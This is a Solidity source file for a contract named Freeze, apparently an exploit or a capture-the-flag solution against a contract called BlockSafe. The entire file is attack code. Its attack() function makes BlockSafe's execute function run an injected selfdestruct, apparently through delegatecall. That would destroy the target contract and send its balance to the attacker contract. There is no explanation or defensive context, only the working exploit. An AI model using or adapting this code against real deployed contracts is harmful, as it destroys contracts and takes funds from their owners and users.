pragma solidity 0.8.13;
import "hardhat/console.sol";

interface IBlockSafe {
    function execute(address, bytes memory, uint8) external;
}

contract Freeze {
    address payable owner;
    IBlockSafe blockSafe;

    constructor(address _blockSafe) {
        blockSafe = IBlockSafe(_blockSafe);
        owner = payable(msg.sender);
    }

    function freeze(address payable _retriver) external {
        selfdestruct(_retriver);
    }

    function attack() external {
        bytes memory data = abi.encodeWithSignature(
            "freeze(address)",
            address(this)
        );
        // console.log("Called the execute");
        blockSafe.execute(address(this), data, 2);
    }

    receive() external payable {}
}
